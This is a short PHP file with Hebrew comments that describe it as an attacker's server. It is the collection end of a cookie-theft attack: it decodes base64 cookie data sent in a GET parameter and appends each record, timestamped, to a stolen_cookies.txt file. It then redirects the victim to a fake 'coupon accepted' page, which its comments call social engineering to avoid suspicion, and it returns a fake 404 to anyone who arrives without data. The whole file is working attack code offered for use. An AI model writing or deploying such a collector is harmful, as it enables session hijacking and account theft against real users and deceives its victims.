<?php
// שרת התוקף - תיעוד נתונים והסוואה

if (isset($_GET['data'])) {
    // 1. פענוח ותיעוד העוגיות שנגנבו
    $stolen_data = base64_decode($_GET['data']);
    $file = fopen("stolen_cookies.txt", "a");
    fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
    fclose($file);

    // 2. הנדסה חברתית: העברת הקורבן לדף "הקופון נקלט" כדי למנוע חשד
    // ודאי שהקובץ coupon_success.php קיים בתיקייה הראשית של האתר
    header("Location: coupon_success.php");
    exit(); // חשוב לעצור את הרצת הסקריפט אחרי ההפניה
}

// אם מישהו נכנס ללינק בלי נתונים, אפשר להשאיר 404 גנרי
http_response_code(404);
echo "Not Found";
?>